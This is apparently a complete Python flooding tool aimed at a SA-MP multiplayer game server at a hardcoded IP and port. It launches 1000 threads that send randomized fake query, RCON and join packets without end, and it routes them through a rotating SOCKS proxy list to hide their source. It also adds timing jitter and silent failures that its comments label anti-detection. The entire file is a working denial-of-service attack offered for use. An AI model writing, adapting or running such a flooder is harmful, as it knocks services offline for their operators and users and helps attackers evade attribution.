import socket
import random
import threading
import time
from socks import socksocket, PROXY_TYPE_SOCKS4, PROXY_TYPE_SOCKS5
import csv

# ===== CONFIG ===== #
TARGET_IP = "185.143.177.14"  # Your server IP
TARGET_PORT = 9999            # SA-MP port
THREADS = 1000                # Concurrent connections
FLOOD_DURATION = 0            # 0 = infinite (Ctrl+C to stop)
PROXY_FILE = "proxies.txt"    # Your proxy list file
USE_PROXY = True              # Enable proxy rotation

# ===== PROXY LOADER ===== #
def load_proxies():
    proxies = []
    try:
        with open(PROXY_FILE, mode='r') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                if row['protocols'] in ['socks4', 'socks5']:
                    proxies.append({
                        'ip': row['ip'],
                        'port': int(row['port']),
                        'type': PROXY_TYPE_SOCKS5 if row['protocols'] == 'socks5' else PROXY_TYPE_SOCKS4,
                        'speed': float(row['speed']),
                        'country': row['country']
                    })
        print(f"[+] Loaded {len(proxies)} proxies from {PROXY_FILE}")
        return sorted(proxies, key=lambda x: x['speed'], reverse=True)[:500]  # Top 500 fastest
    except Exception as e:
        print(f"[!] Proxy load error: {e}")
        return []

# ===== PACKET GENERATOR ===== #
def generate_samp_packet():
    """Creates realistic SA-MP 0.3.7 UDP packets"""
    packet_types = [
        b"SAMP",  # Server query
        b"PLAYERLIST",  # Player list request
        b"RCON",  # RCON packet
        b"JOIN" + bytes([random.randint(0, 255)] * 16) # Fake join request
    ]
    return random.choice(packet_types) + bytes([random.randint(0, 255) for _ in range(32)])

# ===== FLOODER THREAD ===== #
def flood_thread(proxy=None):
    while True:
        sock = None
        try:
            # Create socket with/without proxy
            if proxy and USE_PROXY:
                sock = socksocket()
                sock.set_proxy(
                    proxy_type=proxy['type'],
                    addr=proxy['ip'],
                    port=proxy['port'],
                    rdns=True
                )
                sock.settimeout(3)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)

            # Send crafted packet
            packet = generate_samp_packet()
            sock.sendto(packet, (TARGET_IP, TARGET_PORT))
            
            # Anti-detection delays
            time.sleep(random.uniform(0.001, 0.05))  # Varies packet timing

        except Exception as e:
            pass  # Silent fail to avoid detection
        finally:
            if sock:
                sock.close()
            time.sleep(0.1 if proxy else 0.01)  # Reconnect delay

# ===== MAIN ===== #
if __name__ == "__main__":
    proxies = load_proxies()
    active_threads = []

    print(f"[!] Starting flood to {TARGET_IP}:{TARGET_PORT}")
    print(f"[!] Threads: {THREADS} | Proxies: {len(proxies)}")

    # Start threads
    for i in range(THREADS):
        proxy = random.choice(proxies) if (USE_PROXY and proxies) else None
        t = threading.Thread(target=flood_thread, args=(proxy,), daemon=True)
        t.start()
        active_threads.append(t)

    try:
        while True:  # Run indefinitely
            time.sleep(1)
            print(f"[+] Active threads: {threading.active_count() - 1}", end='\r')
    except KeyboardInterrupt:
        print("\n[!] Stopping flood...")